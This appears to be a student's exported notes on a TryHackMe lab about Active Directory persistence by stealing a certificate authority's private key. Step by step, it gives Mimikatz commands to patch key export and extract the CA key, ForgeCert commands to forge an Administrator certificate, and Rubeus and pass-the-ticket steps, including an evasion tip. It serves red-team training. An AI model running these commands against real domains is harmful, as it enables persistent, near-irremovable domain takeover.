<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Certificates</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Certificates</h1><br/><strong><h1>Persistence Through Certificates</h1></strong><br /><br /><strong>A quick note here. The techniques discussed from this point forward are incredibly invasive and hard to remove. Even if you have signoff on your red team exercise to perform these techniques, you must take the utmost caution when performing these techniques. In real-world scenarios, the exploitation of most of these techniques would result in a full domain rebuild. Make sure you fully understand the consequences of using these techniques and only perform them if you have prior approval on your assessment and they are deemed necessary. In most cases, a red team exercise would be dechained at this point instead of using these techniques. Meaning you would most likely not perform these persistence techniques but rather simulate them.</strong><br /><br />The last two persistence techniques relied on credentials. While we can definitely make the blue team&#39;s lives complicated, they can ultimately rotate enough credentials to kick us out. So while these techniques are great to keep the blue team busy while we keep them busy, we should look to use persistence techniques that are credential agnostic, meaning the rotation of these will not kick us out. The first of these we will be looking at is certificates.<br /><br /><br /><strong><h3>The Return of AD CS</h3></strong><br /><br />In the Exploiting AD room, we leveraged certificates to become Domain Admins. However, certificates can also be used for persistence. All we need is a valid certificate that can be used for Client Authentication. This will allow us to use the certificate to request a TGT. The beauty of this? We can continue requesting TGTs no matter how many rotations they do on the account we are attacking. The only way we can be kicked out is if they revoke the certificate we generated or if it expires. Meaning we probably have persistent access by default for roughly the next 5 years.<br /><br />If you are interested in a refresh about requesting a certificate and using it for Kerberos authentication, please go to either the Exploiting AD or AD Certificates Template room. However, in this room, we are not messing around. We are going after the Certificate Authority (CA) itself.<br /><br />Depending on our access, we can take it another step further. We could simply steal the private key of the root CA&#39;s certificate to generate our own certificates whenever we feel like it. Even worse, since these certificates were never issued by the CA, the blue team has no ability to revoke them. This would be even worse for the blue team since it would mean a rotation of the CA, meaning all issued certificates would have to be revoked by the blue team to kick us out. Imagine you&#39;ve just spent the last two days performing a domain takeback by rotating the credentials of every single privileges account, resetting all the golden and silver tickets, just to realise the attackers persisted by becoming your CA. Yikes!<br /><br /><br /><strong><h3>Extracting the Private Key</h3></strong><strong><br /></strong><br />The private key of the CA is stored on the CA server itself. If the private key is not protected through hardware-based protection methods such as an <strong>Hardware Security Module (HSM)</strong>, which is often the case for organisations that just use <strong>Active Directory Certificate Services (AD CS)</strong> for internal purposes, it is protected by the machine <strong>Data Protection API (DPAPI)</strong>. This means we can use tools such as “<strong>Mimikatz</strong> and <strong>SharpDPAPI</strong>” to extract the CA certificate and thus the private key from the CA. Mimikatz is the simplest tool to use, but if you want to experience other tools, have a look <strong>here</strong>. Use SSH to authenticate to THMDC.za.tryhackme.loc using the Administrator credentials from Task 2, create a unique directory for your user, move to it, and load Mimikatz:<br /><br />Links: <strong>https://pentestlab.blog/2021/11/15/golden-certificate/</strong> <br />Links: <strong>https://github.com/GhostPack/SharpDPAPI</strong> <br /><br />First, we SSH to Administrator account  into the <strong>THMDC.za.tryhackme.loc</strong> machine &amp; start mimikatz:<br /><strong>Note:</strong> As we are attacking the CA, we need to access the <strong>DC machine</strong> to get the certificates.<br /><br /><strong>To View the Certificates Stored on the DC</strong><br /><br /><strong>crypto::certificates /systemstore:local_machine</strong><br /><br /><img src="images/359-1.png" alt="images/359-1.png" /><br /><br />We can see that there is a CA certificate on the DC. We can also note that some of these certificates were set <strong>not to allow us to export</strong> the key. Without this private key, we would not be able to generate new certificates. Luckily, <strong>Mimikatz</strong> allows us to <strong>patch memory</strong> to make these keys <strong>exportable</strong>:<br /><br /><strong>privilege::debug<br />crypto::capi<br />crypto::cng</strong><br /><br /><img src="images/359-2.png" alt="images/359-2.png" /><br /><br />If you get an error, don&#39;t worry, it just means someone else executed the patch before you. With these services patched, we can use Mimikatz to export the certificates:[I didn&#39;t get any error]<br /><br /><strong>crypto::certificates /systemstore:local_machine /export</strong><br /><br /><img src="images/359-3.png" alt="images/359-3.png" /><br /><br /><br />The exported certificates will be stored in both <strong>PFX</strong> and <strong>DER</strong> format to disk. We can view them in the current working directory.<br /><br /><img src="images/359-4.png" alt="images/359-4.png" /><br /><br /><br />The <strong>za-THMDC-CA.pfx</strong> certificate is the one we are particularly interested in. In order to export the private key, a password must be used to encrypt the certificate. <strong>By default</strong>, Mimikatz assigns the <strong>password</strong> of <strong>mimikatz</strong>. <strong>Download</strong> or <strong>copy</strong> this certificate to your AttackBox using <strong>SCP</strong>, and then <strong>copy</strong> it to your <strong>low-privileged</strong> <strong>user</strong>&#39;s home directory on <strong>THMWRK1</strong>. You can also perform the rest of the steps on your <strong>own non-domain-joined Windows machine</strong> if you prefer.<br /><br /><span style="text-decoration:underline;">Downloading the Certificates to Local kali Machine:</span><br /><br /><strong>scp za.tryhackme.loc\\Administrator@thmdc.za.tryhackme.loc:c:/\Users/\Administrator/\cybex/\local_machine_My_1_za-THMDC-CA.der za-THMDC-CA.der<br />scp za.tryhackme.loc\\Administrator@thmdc.za.tryhackme.loc:c:/\Users/\Administrator/\cybex/\local_machine_My_1_za-THMDC-CA.pfx za-THMDC-CA.pfx</strong><br /><br /><img src="images/359-5.png" alt="images/359-5.png" /><br /><br /><span style="text-decoration:underline;">Uploading the Certificates to the THMWRK1 machine:</span><br /><br /><strong>scp za-THMDC-CA.der za.tryhackme.loc\\lorraine.gill@THMWRK1.za.tryhackme.loc:C:/\Users/\lorraine.gill/\za-THMDC-CA.der<br />scp za-THMDC-CA.pfx za.tryhackme.loc\\lorraine.gill@THMWRK1.za.tryhackme.loc:C:/\Users/\lorraine.gill/\za-THMDC-CA.pfx</strong><br /><br /><img src="images/359-6.png" alt="images/359-6.png" /><br /><br /><br /><strong><h3>Generating our own Certificates</h3></strong><br /><br />Now that we have the private key and root CA certificate, we can use the <strong>SpectorOps ForgeCert</strong> tool to forge a Client Authenticate certificate for any user we want. The ForgeCert and Rubeus binaries are stored in the C:\Tools\ directory on THMWRK1. Let&#39;s use ForgeCert to generate a new certificate:<br /><br />Link: <strong>https://github.com/GhostPack/ForgeCert</strong> <br /><br /><strong>C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123</strong><br /><br /><strong>Parameters explained:</strong><br /><br />    <strong>• CaCertPath</strong> - The path to our exported CA certificate.<br />    <strong>• CaCertPassword</strong> - The password used to encrypt the certificate. By default, Mimikatz assigns the password of mimikatz.<br />    <strong>• Subject</strong> - The subject or common name of the certificate. This does not really matter in the context of what we will be using the certificate for.<br />    <strong>• SubjectAltName</strong> - This is the User Principal Name (UPN) of the account we want to impersonate with this certificate. It has to be a legitimate user.<br />    <strong>• NewCertPath</strong> - The path to where ForgeCert will store the generated certificate.<br />    <strong>• NewCertPassword</strong> - Since the certificate will require the private key exported for authentication purposes, we must set a new password used to encrypt it.<br />    <br /><br /><strong>Note:</strong> Use the above in the THMWRK1 machine.<br /><br /><img src="images/359-7.png" alt="images/359-7.png" /><br /><br /><br />We now have our forged certificate. We can use Rubeus to request a TGT using the certificate to verify that the certificate is trusted. We will use the following command:<br /><br /><strong>C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:fullAdmin.pfx /password:Password123 /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.61.101</strong><br /><br />Let&#39;s break down the parameters:<br /><br />    <strong>• /user </strong>- This specifies the user that we will impersonate and has to match the UPN for the certificate we generated<br />    <strong>• /enctype</strong> -This specifies the encryption type for the ticket. Setting this is important for evasion, since the default encryption algorithm is weak, which would result in an overpass-the-hash alert<br />    <strong>• /certificate</strong> - Path to the certificate we have generated<br />    <strong>• /password</strong> - The password for our certificate file<br />    <strong>• /outfile</strong> - The file where our TGT will be output to<br />    <strong>• /domain </strong>- The FQDN of the domain we are currently attacking<br />    <strong>• /dc </strong>- The IP of the domain controller which we are requesting the TGT from. Usually, it is best to select a DC that has a CA service running<br />    <br /><img src="images/359-8.png" alt="images/359-8.png" /><br /><br /><br />Now we can use <strong>Mimikatz</strong> to load the TGT and authenticate to THMDC:<br /><br /><strong>kerberos::ptt administrator.kirbi</strong><br /><br /><img src="images/359-9.png" alt="images/359-9.png" /><br /><br /><strong><span style="text-decoration:underline;">We Are No Longer Friends With The Blue Team</span></strong><br /><br />Certificate persistence is significantly harder to defend against. Even if you rotate the credentials of the compromised account, the certificate will still be valid. The only way to remove the persistence is to issue a revocation of the certificate. However, this would only be possible if we generated the certificate through legitimate channels. Since we exported the CA and generated the certificate ourselves, it does not appear on AD CS&#39;s list of issued certificates, meaning the blue team will not be able to revoke our certificate.<br /><br />So what&#39;s the only solution to remove the persistence? Well, this is why we are no longer friends. They will have to revoke the root CA certificate. But revoking this certificate means that all certificates issued by AD CS would all of a sudden be invalid. Meaning they will have to generate a new certificate for every system that uses AD CS. You should start to see why this type of persistence is incredibly dangerous and would require full rebuilds of systems if performed.<br /><br /></div>
</body>
</html>
